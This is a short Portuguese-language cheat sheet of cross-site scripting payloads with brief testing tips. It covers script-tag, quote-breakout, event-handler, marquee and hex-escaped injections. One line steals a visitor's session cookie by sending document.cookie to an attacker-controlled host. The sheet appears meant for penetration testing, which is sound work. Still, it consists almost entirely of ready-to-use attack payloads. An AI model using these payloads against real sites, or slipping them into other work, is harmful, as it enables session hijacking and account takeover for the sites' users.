#### Uso geral
<script>alert(1)</script>

#### Caso esteja dentro de caracteres especiais
"><script>alert(1)</script><"

#### Sem javascript puro
" onfocus="alert(1)"

#### Sequesto por requisição
<script>new Image().src = "http://attacker.example.com/?" + document.cookie</script>

#### Dom Based
<marquee onstart="alert(1)">XSS</marquee>

#### Single App Pages injection via hexadecimal/ASCII
##### Obs: trocar < e > por valores ASCII
\x3cscript\x3ealert(1)\x3c/script\x3e

#### Dicas
- verificar sublinks, as vezes o valor não é escapado dentro deles
- verificar todos os campos, nem sempre todos os campos são escapados corretamente